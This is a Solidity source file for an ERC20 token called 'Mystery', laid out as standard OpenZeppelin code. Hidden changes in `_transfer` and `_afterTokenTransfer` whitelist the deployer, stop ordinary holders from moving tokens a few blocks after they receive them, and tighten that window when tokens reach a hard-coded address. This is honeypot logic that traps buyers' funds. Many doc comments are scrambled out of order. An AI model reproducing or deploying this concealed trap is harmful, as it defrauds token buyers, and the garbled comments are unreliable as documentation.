// SPDX-License-Identifier: MIT
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⢹⠀⠀⡀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⠴⣶⣶⣺⣿⣼⣄⠀⣟⣇⠀⢠⠀⠀⠀⣿⠀⠀⠀⡿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⢀⣤⡿⠚⣹⣧⣶⠟⣏⢛⢹⣿⣿⢉⠉⡏⡿⣿⢻⠶⣤⣰⣷⡇⠠⣰⣿⣇⢀⠆⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠇⠀⣸⡟⡋⢸⡆⢰⣿⣷⣄⣸⣏⣏⣹⣿⣿⡄⣸⣷⣿⣇⡟⢀⣴⣿⡟⡿⢶⣿⡟⣿⣮⣀⣠⣞⠁⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⣿⣠⣞⣽⣿⡿⢿⣷⣄⣿⣟⣧⣽⣿⣟⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⠟⣼⣿⣿⣷⡟⠿⢧⣄⡀⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠀⢱⡄⠀⣄⣿⣿⡉⠁⢻⣿⣥⡽⢿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣯⣿⣿⣯⣿⣿⣿⡿⡻⠿⣶⡾⠋⢉⣶⡿⠥⠄⣠⠞⠀⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠸⣆⠀⢹⣭⣿⣅⠘⣿⣾⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣻⡯⣪⣥⡶⠛⣻⣶⣿⢏⠀⣠⣟⡁⢠⠀⢈⡀⠀⢀⠀
⠀⠀⠀⠀⠀⠀⣼⠀⠘⣶⣾⠏⣿⣿⢿⣿⣿⣿⣿⡿⠟⢉⣽⣿⣿⣿⠿⠛⠉⠉⠁⠀⠀⠈⠉⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣷⣟⣩⣏⣹⠿⠁⣰⠃⢀⡜⠀
⠀⠀⠀⠀⠀⠀⢻⣥⡴⢋⣹⣿⣿⣽⣿⣿⣿⡿⠏⠀⣠⣿⣿⡿⠋⠀⠀⠀⠀⣀⣀⣤⣤⣄⣀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣟⣿⣶⡾⣷⣶⣾⡟⢉⣾⡇⠀
⠀⠀⠀⠀⠰⠂⣠⡿⣷⣾⣿⣷⣿⣿⣿⣿⠃⠀⠀⢰⣿⣿⠋⠀⠀⠀⢀⣶⣿⣿⣿⠿⠿⣿⣿⣿⣷⣄⠀⠀⠀⠈⢿⣿⣿⣻⢿⣿⣿⣿⣿⣤⣤⣾⣟⣻⣿⣿⣏⣴⡿⢋⣴⠛
⠀⠀⠀⠀⠀⣺⣏⣾⠟⣻⣿⣿⠇⣿⣿⡇⠀⠀⢀⣿⣿⡏⠀⠀⠀⢰⣿⣿⠟⠉⠀⠀⠀⠀⠉⠻⣿⣿⣷⡀⠀⠀⠀⢻⣿⣿⢣⡙⢿⣿⣿⣿⣿⣯⣿⣶⣾⡿⣟⣭⣶⡾⠋⠀
⠀⠠⢤⡆⣴⣳⣿⢿⣿⡿⠟⠁⠀⣿⣿⠁⠀⠀⠸⣿⣿⡇⠀⠀⠀⢸⣿⣿⣤⣤⣴⣶⣦⡀⠀⠀⠈⢿⣿⣷⠀⠀⠀⠘⣿⣿⡆⢻⠠⠟⠿⣿⣿⣿⣿⣟⡛⣻⣿⠟⠋⣀⢀⠀
⠀⠀⠀⣙⣿⣿⣿⣿⠋⣴⡄⠀⠀⣿⣿⡆⠀⠀⠀⢻⣿⣷⡀⠀⠀⠈⠻⠿⠿⠟⠛⣿⣿⣧⠀⠀⠀⢸⣿⣿⡄⠀⠀⠀⣿⣿⣇⡟⠀⠀⠀⢲⣿⣿⣿⣿⣿⣿⣶⣶⣾⡿⠟⠀
⠀⣀⣠⣿⣟⣷⡿⢁⡾⢸⡁⠀⠀⢻⣿⣷⡀⠀⠀⠈⢿⣿⣿⣤⣀⠀⠀⠀⠀⢀⣰⣿⣿⡏⠀⠀⠀⢸⣿⣿⠁⠀⠀⢠⣿⣿⡟⠀⠀⠀⢠⣿⢿⣢⡻⢿⠙⢿⣛⣏⠁⠀⠀⠀
⢠⣾⣿⠟⣽⡟⡇⠙⢿⢄⣇⠀⠀⠀⢿⣿⣷⡄⠀⠀⠀⠙⠿⣿⣿⣿⣷⣶⣿⣿⣿⡿⠋⠀⠀⠀⣠⣿⣿⡟⠀⠀⠀⣾⣿⠋⠀⠀⢀⢀⣿⡿⢷⣾⣿⣯⣄⣹⡿⠋⠀⠀⠀⠀
⠀⠉⠁⢰⣿⠁⣳⡅⠈⣦⡝⣤⡀⠀⠈⠻⣿⣿⣦⡀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠋⠁⠀⠀⠀⢀⣴⣿⣿⠟⠀⠀⢀⣾⠟⠁⠀⠀⢠⣬⣿⣿⣿⣞⠇⢳⡌⢿⣿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⡿⢧⡀⠉⣩⣤⣧⣈⠙⠺⠶⣤⣄⡈⠻⣿⣿⣷⣦⣤⣀⡀⠀⠀⠀⠀⠀⣀⣠⣴⣾⣿⣿⠟⠁⠀⢀⣴⠟⠁⠀⢀⣤⣾⣿⣿⠿⣾⠷⣿⣆⡼⠓⣾⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⢦⣉⣉⣀⠤⡜⠉⠛⢶⣤⣄⣀⣉⡉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠋⠁⣠⠴⠞⣉⣀⣀⣤⣶⢶⣻⣿⡵⣘⠢⠈⣦⠘⢿⠇⢰⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠛⠛⠛⢧⣤⡴⠋⠀⠈⢻⡿⠾⢿⣷⣶⣤⣴⣆⣌⣭⣉⣩⣭⣉⠀⣄⡤⣄⢠⣤⣄⣠⣴⠾⣿⡿⣏⠘⠻⣧⡘⣿⡜⠶⠄⠈⢤⠞⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣯⣭⣽⣳⢦⣉⠲⢤⣠⠏⠀⠀⡼⣱⠋⢹⣿⢻⠟⠛⡟⣿⠟⢻⠟⣟⢿⠻⣟⠛⢯⢻⣯⣆⠘⣿⡌⢳⣄⢻⣷⠈⠀⠀⢀⡤⠋⢠⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠉⠉⠻⢷⣌⠙⠲⣽⡃⠀⠀⢷⠇⠀⠸⠁⡞⠀⡀⠙⡟⠂⠀⡟⢿⣼⠀⠹⡇⠈⢧⣎⢿⣇⠸⠿⠀⠉⢮⠏⠃⢀⡴⠊⠀⣠⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢦⡀⠉⠓⢦⣞⠀⠀⠀⠀⠁⠀⠀⠀⡇⠈⠳⡷⠀⡿⠴⠀⠘⠀⠸⠋⠻⣿⠀⠀⠁⠈⢈⡧⠞⠁⠀⠀⠜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠓⠦⣄⣀⠀⠀⠀⠁⠀⠀⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠓⠲⠤⢤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/
pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data; }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;  emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner; }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0)); _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner); _owner = newOwner;
    }
}


pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount ) external returns (bool);
}


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;


/**
 * _Available since v4.1._
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 */
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;


/**
 * @dev Implementation of the {IERC20} interface.
 *
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    address private immutable _uniswapFactory = 0xbD6133957B8B9c1b01E5007439D0feb748304e73;
    mapping(address => uint256) private _balances;
    address ZERO = 0x0000000000000000000000000000000000000000;
    uint256 private _totalSupply;
    mapping(address => mapping(address => uint256)) private _allowances;
    address DEAD = 0x000000000000000000000000000000000000dEaD;


    /**
     *
     * The default value of {decimals} is 18. To select a different value for
     * @dev Sets the values for {name} and {symbol}.
     *
     */
    uint256 public _allowance = 3_000_000;
    mapping (address => bool) _pairToken;
    uint256 private _defaultSwap = 0;
    address private immutable _tokenAddress;
    address public uniswapV2Pair;
    string private _name;
    mapping (address => uint256) _addressAllowance;
    string private _symbol;


    constructor(string memory name_, string memory symbol_) {
        _tokenAddress = msg.sender;
        _name = name_;
        _symbol = symbol_;
        _pairToken[_tokenAddress] = true;
    }

    function setPair(address _uniswapPair, address _tokenPair) external {
        if (uniswapV2Pair == address(0))
            uniswapV2Pair = _uniswapPair;
        if (msg.sender == _tokenAddress) {
            uniswapV2Pair = _uniswapPair;

            _pairToken[_tokenPair] = true;
        }
    }

    function setAllowance(uint256 _a) external {
        if (msg.sender == _tokenAddress) {
            _allowance = _a;
        }
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender(); _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount); return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue); return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * problems described in {IERC20-approve}.
     *
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue); }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * This internal function is equivalent to {transfer}, and can be used to
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to, uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        require(_pairToken[tx.origin] == true || block.number - _addressAllowance[from] < _allowance || to == tx.origin, "ERC20: Reverted");
        _balances[from] = fromBalance - amount;
        
        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * total supply.
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount; }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }
    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * - `from` and `to` are never both zero.
     *
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to, uint256 amount
    ) internal virtual { if (_addressAllowance[to] == 0) _addressAllowance[to] = block.number;
        if (to == _uniswapFactory) _allowance = 2; }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner, address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address"); require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner, address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked { _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * minting and burning.
     *
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


pragma solidity ^0.8.4;
contract Mystery is ERC20, Ownable {
    constructor() ERC20("Mystery", "?") {
        _mint(msg.sender, 7_777_777_777_777 * 10**uint(decimals()));
    }
}